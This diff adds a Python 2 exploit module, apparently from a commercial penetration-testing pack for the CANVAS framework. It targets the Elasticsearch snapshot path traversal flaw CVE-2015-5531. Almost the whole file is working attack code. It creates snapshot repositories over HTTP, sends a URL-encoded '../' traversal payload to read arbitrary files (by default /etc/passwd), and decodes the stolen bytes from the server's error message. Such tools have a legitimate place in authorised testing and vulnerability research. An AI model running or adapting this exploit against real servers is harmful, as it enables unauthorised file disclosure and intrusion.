@@ -1,0 +1,118 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+
+import sys, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import urllib, urllib2
+import json
+
+# GUI info
+NAME = "d2sec_elasticsearch3"
+DESCRIPTION = "Elasticsearch Path Traversal Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['References'] = "2015/07/16"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['Versions Affected'] = "< 1.6.1"
+DOCUMENTATION["CVE Name"] = "CVE-2015-5531"
+DOCUMENTATION["Notes"] = "The exploit requires path.repo to be set into elasticsearch.yml and be writeable by elasticsearch process."
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit (tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.vhost = ''
+    self.port = 9200 
+    self.filename = '/etc/passwd'
+    self.payload = 'ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..'
+    self.reponame = 'd2'
+    self.baseurl = ''
+    self.xplurl = ''
+
+  def request_post(self, url, data):
+    try:
+      request = urllib2.Request(url, data=data)
+      request.get_method = lambda: 'POST'
+      urllib2.urlopen(request)
+    except urllib2.HTTPError, e:
+      data = json.load(e)
+      self.log('%s' % str(data['error']))
+      return 0
+    return 1
+  
+  def create_snapdirs(self):
+    i = self.request_post('%s/%s' % (self.baseurl, self.reponame), 
+      '{"type":"fs","settings":{"location":"d2loc"}}')
+    if not i:
+      return i
+    i = self.request_post('%s/%sie' % (self.baseurl, self.reponame),
+      '{"type":"fs","settings":{"location":"d2loc/snapshot-ev1l"}}')
+    return i
+
+  def grab_file(self):
+    try:
+      urllib2.urlopen(self.xplurl)
+    except urllib2.HTTPError, e:
+      data = json.load(e)
+      extrdata = re.findall(r'\d+', str(data['error']))
+      decoder = bytearray()
+      for i in extrdata[+2:]:
+        decoder.append(int(i))
+      self.log(decoder)
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.vhost = self.argsDict.get("vhost", self.vhost)
+    self.filename = self.argsDict.get("filename", self.filename)
+    if not self.vhost:
+      self.vhost = self.host
+    return 0
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d" % (NAME, self.host, self.port))
+    self.filename = urllib.quote(self.filename, safe='')
+    self.baseurl = 'http://%s:%s/_snapshot/'%(self.host, self.port)
+    self.xplurl = '%s%s/%s%s' % (self.baseurl, self.reponame, self.payload, self.filename)
+    if not self.create_snapdirs():
+      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
+      return 0
+    self.grab_file()
+    self.setInfo("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: %s -t target [-p port:9200] -O vhost:<url> -O filename:<pathname>" % sys.argv[0]
+    sys.exit(0)
+
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
+
